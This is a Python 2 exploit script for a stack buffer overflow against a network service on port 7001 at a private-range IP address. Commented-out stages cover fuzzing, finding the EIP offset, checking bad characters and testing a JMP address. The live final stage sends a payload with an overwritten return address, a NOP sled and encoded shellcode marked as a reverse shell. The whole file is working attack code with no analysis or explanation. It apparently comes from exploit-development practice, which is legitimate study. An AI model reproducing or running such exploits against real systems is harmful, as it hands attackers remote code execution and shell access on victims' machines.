#!/usr/bin/python
import socket
import time


#Memory top address stack: 0x042afe6c
# +18fc



# EIP: 33794332
# ESP: 042AEE6C
# JMP ADD: 0x148010cf




# if __name__ == '__main__':
#   try:
#     print "\nSending evil buffer..."
#
#     pattern = open("512000_pattern.txt", "r")
#     pattern = pattern.read()
#
#     count = 1
#     while count < 202:
#
#       # buffer = "A" * 0xA00 * 10 * count
#
#       # buffer = pattern[:0xA00 * 1000 * count]
#
#       buffer = pattern
#
#       # buffer = "A" * 0xA00
#
#       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#       print("Count: " + str(count))
#       print("Length: " + str(len(buffer)))
#       print(buffer)
#       s.connect(("192.168.178.79", 7001))
#       s.send(buffer)
#
#       s.close()
#       count = count + 1
#
#     time.sleep(0.2)
#     print "\nDone!"
#
#   except Exception as e:
#     print "\nCould not connect: " + str(e)


# CHECK EIP
# if __name__ == '__main__':
#   try:
#     print "\nSending evil buffer..."
#
#     filler = "A" * 2288
#     eip = "B" * 4
#     offset = "C" * (512000 - (len(filler) + len(eip)))
#
#     buffer = filler + eip + offset
#
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     print(len(buffer))
#     s.connect(("192.168.178.79", 7001))
#     s.send(buffer)
#
#     s.close()
#
#     print "\nDone!"
#
#   except Exception as e:
#     print "\nCould not connect: " + str(e)



# # CHECK BAD CHARS
# if __name__ == '__main__':
#   try:
#     print "\nSending evil buffer..."
#
#     badchars = (
#         "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10"
#         "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
#         "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
#         "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#         "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
#         "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#         "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
#         "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#         "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
#         "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#         "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
#         "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
#         "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
#         "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#         "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
#         "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#     )
#
#     filler = "A" * 2288
#     eip = "B" * 4
#     offset = "C" * 8
#
#     buffer = filler + eip + offset + badchars
#
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     print(len(buffer))
#     s.connect(("192.168.178.79", 7001))
#     s.send(buffer)
#
#     s.close()
#
#     print "\nDone!"
#
#   except Exception as e:
#     print "\nCould not connect: " + str(e)
#



# JMP CHECK
# if __name__ == '__main__':
#   try:
#     print "\nSending evil buffer..."
#
#     filler = "A" * 2288
#     eip = '\xcf\x10\x80\x14'
#     offset = "C" * 8
#     shell = "D" * 500
#
#     buffer = filler + eip + offset + shell
#
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     print(len(buffer))
#     s.connect(("192.168.178.79", 7001))
#     s.send(buffer)
#
#     s.close()
#
#     print "\nDone!"
#
#   except Exception as e:
#     print "\nCould not connect: " + str(e)


# REVERSE SHELL
if __name__ == '__main__':
  try:
    print "\nSending evil buffer..."

    filler = "A" * 2288
    eip = '\xcf\x10\x80\x14'
    offset = "C" * 8
    nops = "\x90" * 10
    shell = (
      "\xdd\xc0\xba\xd7\xb0\xad\xae\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
      "\x52\x83\xe8\xfc\x31\x50\x13\x03\x87\xa3\x4f\x5b\xdb\x2c\x0d"
      "\xa4\x23\xad\x72\x2c\xc6\x9c\xb2\x4a\x83\x8f\x02\x18\xc1\x23"
      "\xe8\x4c\xf1\xb0\x9c\x58\xf6\x71\x2a\xbf\x39\x81\x07\x83\x58"
      "\x01\x5a\xd0\xba\x38\x95\x25\xbb\x7d\xc8\xc4\xe9\xd6\x86\x7b"
      "\x1d\x52\xd2\x47\x96\x28\xf2\xcf\x4b\xf8\xf5\xfe\xda\x72\xac"
      "\x20\xdd\x57\xc4\x68\xc5\xb4\xe1\x23\x7e\x0e\x9d\xb5\x56\x5e"
      "\x5e\x19\x97\x6e\xad\x63\xd0\x49\x4e\x16\x28\xaa\xf3\x21\xef"
      "\xd0\x2f\xa7\xeb\x73\xbb\x1f\xd7\x82\x68\xf9\x9c\x89\xc5\x8d"
      "\xfa\x8d\xd8\x42\x71\xa9\x51\x65\x55\x3b\x21\x42\x71\x67\xf1"
      "\xeb\x20\xcd\x54\x13\x32\xae\x09\xb1\x39\x43\x5d\xc8\x60\x0c"
      "\x92\xe1\x9a\xcc\xbc\x72\xe9\xfe\x63\x29\x65\xb3\xec\xf7\x72"
      "\xb4\xc6\x40\xec\x4b\xe9\xb0\x25\x88\xbd\xe0\x5d\x39\xbe\x6a"
      "\x9d\xc6\x6b\x3c\xcd\x68\xc4\xfd\xbd\xc8\xb4\x95\xd7\xc6\xeb"
      "\x86\xd8\x0c\x84\x2d\x23\xc7\x6b\x19\x99\x59\x04\x58\xdd\x74"
      "\x88\xd5\x3b\x1c\x20\xb0\x94\x89\xd9\x99\x6e\x2b\x25\x34\x0b"
      "\x6b\xad\xbb\xec\x22\x46\xb1\xfe\xd3\xa6\x8c\x5c\x75\xb8\x3a"
      "\xc8\x19\x2b\xa1\x08\x57\x50\x7e\x5f\x30\xa6\x77\x35\xac\x91"
      "\x21\x2b\x2d\x47\x09\xef\xea\xb4\x94\xee\x7f\x80\xb2\xe0\xb9"
      "\x09\xff\x54\x16\x5c\xa9\x02\xd0\x36\x1b\xfc\x8a\xe5\xf5\x68"
      "\x4a\xc6\xc5\xee\x53\x03\xb0\x0e\xe5\xfa\x85\x31\xca\x6a\x02"
      "\x4a\x36\x0b\xed\x81\xf2\x3b\xa4\x8b\x53\xd4\x61\x5e\xe6\xb9"
      "\x91\xb5\x25\xc4\x11\x3f\xd6\x33\x09\x4a\xd3\x78\x8d\xa7\xa9"
      "\x11\x78\xc7\x1e\x11\xa9"
    )

    buffer = filler + eip + offset + nops + shell


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(len(buffer))
    s.connect(("192.168.178.79", 7001))
    s.send(buffer)

    s.close()

    print "\nDone!"

  except Exception as e:
    print "\nCould not connect: " + str(e)
